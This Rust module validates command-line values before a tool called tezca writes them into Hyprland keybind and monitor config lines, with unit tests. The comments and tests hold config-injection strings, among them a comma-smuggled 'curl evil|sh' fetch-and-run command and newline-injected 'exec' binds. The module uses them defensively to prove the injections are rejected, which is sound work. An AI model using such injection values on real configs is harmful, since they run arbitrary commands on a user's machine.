//! Validation for values that end up verbatim inside a Hyprland config line.
//!
//! `tezca keybind` and `tezca display` both format caller-supplied strings
//! straight into `keybinds.conf` / the managed block. Hyprland's config is
//! line-oriented and comma-separated, so an unchecked value has two ways to break
//! out of its field:
//!
//!   * a **comma** shifts every field after it — `--key 'X, exec, sh -c …'`
//!     lands as `bind = $mod, X, exec, sh -c …`, a working bind that runs an
//!     arbitrary command on keypress;
//!   * a **newline** injects an entire additional directive, because the rewritten
//!     line is later joined back together with `\n`.
//!
//! The `--expect` guard cannot catch either: it checks the value being *replaced*,
//! not the replacement. So every field is checked here before it is formatted in.
//!
//! The allowlists are derived from what Hyprland actually accepts and from the
//! shipped `keybinds.conf` / `monitors.conf`, so nothing already in the repo is
//! rejected: keysyms are `[A-Za-z0-9_:]` (`Control_R`, `mouse:272`,
//! `XF86AudioMute`, `comma`, `SPACE`), modifiers are `$mod`/`SUPER`/`ALT`/`CTRL`/
//! `SHIFT`, and monitor fields are the `WxH@R` / `0x0` / `auto` / `preferred`
//! shapes in `monitors.conf`.

/// A modifier list: whitespace-separated names, or empty for an unmodified bind.
pub fn keybind_mods(v: &str) -> Result<(), String> {
    for tok in v.split_whitespace() {
        // `$mod` is the file's house style for SUPER and must stay writable.
        if tok == "$mod" {
            continue;
        }
        if !tok.chars().all(|c| c.is_ascii_alphabetic()) {
            return Err(format!(
                "invalid modifier {tok:?} — expected names like SUPER, SHIFT, ALT, CTRL (or $mod)"
            ));
        }
    }
    Ok(())
}

/// A single keysym. One token, `[A-Za-z0-9_:]` only.
pub fn keybind_key(v: &str) -> Result<(), String> {
    let k = v.trim();
    if k.is_empty() {
        return Err("key cannot be empty".to_string());
    }
    if let Some(bad) = k.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '_' || *c == ':')) {
        return Err(format!(
            "invalid character {bad:?} in key {k:?} — keysyms are letters, digits, \
             '_' and ':' (e.g. W, F12, comma, Control_R, mouse:272)"
        ));
    }
    Ok(())
}

/// A bind's `# comment` label. Free text, but it has to stay on one line.
pub fn keybind_desc(v: &str) -> Result<(), String> {
    reject_control("description", v)
}

/// A dispatcher plus its arguments (`exec, uwsm app -- firefox`).
///
/// Deliberately permissive: commas separate the dispatcher from its arguments, so
/// they are legitimate here, and the argument is an arbitrary command by design —
/// this is the one field whose whole purpose is to say what to run. Only the
/// line-injection characters are refused.
pub fn keybind_action(v: &str) -> Result<(), String> {
    if v.trim().is_empty() {
        return Err("action cannot be empty".to_string());
    }
    reject_control("action", v)
}

// --- hypr keywords ---------------------------------------------------------

/// A Hyprland option path: `decoration:rounding`, `decoration:blur:size`.
pub fn hypr_option(v: &str) -> Result<(), String> {
    let k = v.trim();
    if k.is_empty() {
        return Err("option name cannot be empty".to_string());
    }
    if let Some(bad) = k.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '_' || *c == ':')) {
        return Err(format!(
            "invalid character {bad:?} in option {k:?} — expected a path like decoration:rounding"
        ));
    }
    Ok(())
}

/// A Hyprland option value.
///
/// Values are genuinely varied — `12`, `0.7`, a `5 5 5 5` gaps tuple, an
/// `rgba(...)` colour — so this is a denylist rather than an allowlist. It refuses
/// the two characters that change the *shape* of the config: a newline (which
/// would append an extra directive that `tezca hypr reset` then cannot remove,
/// because the managed block keys an entry by its first line only) and a `#`
/// (which would comment out the rest of the line and silently truncate the value).
pub fn hypr_value(v: &str) -> Result<(), String> {
    if v.trim().is_empty() {
        return Err("value cannot be empty".to_string());
    }
    reject_control("value", v)?;
    if v.contains('#') {
        return Err(format!(
            "invalid '#' in value {v:?} — it would comment out the rest of the line"
        ));
    }
    Ok(())
}

// --- display ---------------------------------------------------------------

/// A monitor mode: `preferred` / `highres` / `highrr` / `maxwidth` / `disable`,
/// or `<w>x<h>` with an optional `@<rate>`.
pub fn display_mode(v: &str) -> Result<(), String> {
    let m = v.trim();
    if matches!(m, "preferred" | "highres" | "highrr" | "maxwidth" | "disable") {
        return Ok(());
    }
    let (res, rate) = match m.split_once('@') {
        Some((r, hz)) => (r, Some(hz)),
        None => (m, None),
    };
    let Some((w, h)) = res.split_once('x') else {
        return Err(format!(
            "invalid mode {m:?} — expected WIDTHxHEIGHT[@RATE] (e.g. 3440x1440@165) or 'preferred'"
        ));
    };
    for (label, n) in [("width", w), ("height", h)] {
        if n.is_empty() || !n.chars().all(|c| c.is_ascii_digit()) {
            return Err(format!("invalid {label} {n:?} in mode {m:?} — expected a whole number"));
        }
    }
    if let Some(hz) = rate {
        decimal("refresh rate", hz)?;
    }
    Ok(())
}

/// A scale factor: a positive decimal, or `auto`.
pub fn display_scale(v: &str) -> Result<(), String> {
    let s = v.trim();
    if s == "auto" {
        return Ok(());
    }
    let n = decimal("scale", s)?;
    if n <= 0.0 {
        return Err(format!("invalid scale {s:?} — must be greater than zero"));
    }
    Ok(())
}

/// A position: `<x>x<y>` (either may be negative), or an `auto…` placement.
pub fn display_pos(v: &str) -> Result<(), String> {
    let p = v.trim();
    // `auto`, `auto-right`, `auto-left`, `auto-up`, `auto-down`, …
    if p == "auto"
        || p.strip_prefix("auto-")
            .is_some_and(|r| !r.is_empty() && r.chars().all(|c| c.is_ascii_alphabetic() || c == '-'))
    {
        return Ok(());
    }
    // Split on the separator, not on a leading minus sign: `-1920x0` is valid.
    let body = p.strip_prefix('-').map(|r| ("-", r)).unwrap_or(("", p));
    let Some((x, y)) = body.1.split_once('x') else {
        return Err(format!("invalid position {p:?} — expected XxY (e.g. 0x0, 3440x0, -1920x0)"));
    };
    for (label, n) in [("x", x), ("y", y)] {
        let digits = n.strip_prefix('-').unwrap_or(n);
        if digits.is_empty() || !digits.chars().all(|c| c.is_ascii_digit()) {
            return Err(format!(
                "invalid {label} coordinate {n:?} in position {p:?} — expected a whole number"
            ));
        }
    }
    Ok(())
}

/// A transform: an integer 0–7 (the eight rotate/flip states).
pub fn display_transform(v: &str) -> Result<(), String> {
    let t = v.trim();
    match t.parse::<u8>() {
        Ok(n) if n <= 7 => Ok(()),
        _ => Err(format!("invalid transform {t:?} — expected 0-7")),
    }
}

/// A connector name as accepted on the command line (`DP-1`, `HDMI-A-1`, `eDP-1`).
pub fn monitor_name(v: &str) -> Result<(), String> {
    let n = v.trim();
    if n.is_empty() {
        return Err("monitor name cannot be empty".to_string());
    }
    if let Some(bad) = n.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '-' || *c == '_')) {
        return Err(format!(
            "invalid character {bad:?} in monitor name {n:?} — connectors are letters, \
             digits, '-' and '_' (e.g. DP-1, HDMI-A-1)"
        ));
    }
    Ok(())
}

// --- shared ----------------------------------------------------------------

/// Refuse anything that would end the config line early or smuggle a new one.
fn reject_control(field: &str, v: &str) -> Result<(), String> {
    if let Some(bad) = v.chars().find(|c| c.is_control()) {
        return Err(format!(
            "invalid control character {bad:?} in {field} — the value has to stay on one line"
        ));
    }
    Ok(())
}

/// Parse a plain decimal without pulling in a float-format edge case: reject the
/// exotic spellings `f64::from_str` accepts (`inf`, `NaN`, `1e9`, `+1`) so what
/// lands in the config file is what the user typed.
fn decimal(field: &str, v: &str) -> Result<f64, String> {
    let s = v.trim();
    let body = s.strip_prefix('-').unwrap_or(s);
    let ok = !body.is_empty()
        && body.chars().all(|c| c.is_ascii_digit() || c == '.')
        && body.chars().filter(|c| *c == '.').count() <= 1
        && body.chars().any(|c| c.is_ascii_digit());
    if !ok {
        return Err(format!("invalid {field} {s:?} — expected a number like 1, 1.5 or 165"));
    }
    s.parse::<f64>().map_err(|_| format!("invalid {field} {s:?}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_every_modifier_combination_already_in_keybinds_conf() {
        for m in [
            "", "$mod", "$mod ALT", "$mod ALT CTRL", "$mod ALT SHIFT", "$mod CTRL",
            "$mod CTRL SHIFT", "$mod SHIFT", "$mod SHIFT ALT", "ALT", "ALT CTRL", "CTRL",
            "CTRL SHIFT", "SHIFT", "SUPER SHIFT",
        ] {
            assert!(keybind_mods(m).is_ok(), "{m:?} should be a valid modifier list");
        }
    }

    #[test]
    fn accepts_every_keysym_already_in_keybinds_conf() {
        for k in [
            "A", "W", "0", "9", "F12", "comma", "period", "slash", "SPACE", "Tab", "Return",
            "Escape", "Delete", "Print", "left", "right", "up", "down", "Control_R",
            "mouse:272", "mouse_up", "mouse_down", "XF86AudioRaiseVolume", "XF86MonBrightnessUp",
        ] {
            assert!(keybind_key(k).is_ok(), "{k:?} should be a valid keysym");
        }
    }

    #[test]
    fn rejects_a_comma_in_a_key_that_would_inject_a_dispatcher() {
        // The whole point: this would have landed as
        //   bind = $mod, X, exec, sh -c "curl … | sh", <original action>
        let e = keybind_key(r#"X, exec, sh -c "curl evil|sh""#).unwrap_err();
        assert!(e.contains("invalid character"), "{e}");
    }

    #[test]
    fn rejects_a_newline_in_a_key_that_would_inject_a_whole_bind_line() {
        assert!(keybind_key("X\nbind = , F1, exec, evil").is_err());
        assert!(keybind_mods("SUPER\nbind = , F1, exec, evil").is_err());
    }

    #[test]
    fn rejects_line_breaking_characters_in_a_description_and_an_action() {
        assert!(keybind_desc("Browser\nbind = , F1, exec, evil").is_err());
        assert!(keybind_action("exec, foo\nbind = , F1, exec, evil").is_err());
        // But an action's own commas are legitimate — that is its argument list.
        assert!(keybind_action("exec, uwsm app -- brave --new-window").is_ok());
        assert!(keybind_desc("Browser (default)").is_ok());
        assert!(keybind_action("").is_err());
    }

    #[test]
    fn accepts_the_monitor_shapes_used_in_monitors_conf() {
        assert!(display_mode("3440x1440@165").is_ok());
        assert!(display_mode("2560x1440@165").is_ok());
        assert!(display_mode("1920x1080@59.951").is_ok());
        assert!(display_mode("1920x1080").is_ok());
        assert!(display_mode("preferred").is_ok());
        assert!(display_pos("0x0").is_ok());
        assert!(display_pos("3440x0").is_ok());
        assert!(display_pos("-1920x0").is_ok());
        assert!(display_pos("auto").is_ok());
        assert!(display_pos("auto-right").is_ok());
        assert!(display_scale("1").is_ok());
        assert!(display_scale("1.5").is_ok());
        assert!(display_scale("auto").is_ok());
        assert!(display_transform("0").is_ok());
        assert!(display_transform("7").is_ok());
    }

    #[test]
    fn rejects_display_values_that_would_corrupt_the_managed_block() {
        // A newline here previously became an extra Hyprland directive that
        // `tezca display reset` could not remove, because the block is keyed on
        // the first line of an entry only.
        assert!(display_pos("0x0\nexec-once = evil").is_err());
        assert!(display_mode("3440x1440@165\nbind = , F1, exec, evil").is_err());
        assert!(display_scale("1\nmisc:vrr = 0").is_err());
        assert!(display_transform("9").is_err());
        assert!(display_transform("-1").is_err());
        assert!(monitor_name("DP-1, 1x1, 0x0, 1").is_err());
    }

    #[test]
    fn rejects_typos_that_would_break_the_config_on_next_reload() {
        // These are the accidental cases, not the adversarial ones: previously
        // they were written straight through and only failed at relogin.
        assert!(display_scale("abc").is_err());
        assert!(display_scale("0").is_err(), "a zero scale is not usable");
        assert!(display_scale("-1").is_err());
        assert!(display_mode("3440*1440").is_err());
        assert!(display_mode("3440x1440@abc").is_err());
        assert!(display_pos("0,0").is_err());
        // f64 accepts these; a monitor spec must not.
        assert!(display_scale("inf").is_err());
        assert!(display_scale("NaN").is_err());
        assert!(display_scale("1e3").is_err());
    }

    #[test]
    fn accepts_real_connector_names() {
        for n in ["DP-1", "DP-3", "HDMI-A-1", "eDP-1", "DVI-D-1"] {
            assert!(monitor_name(n).is_ok(), "{n:?} should be a valid connector");
        }
    }
}
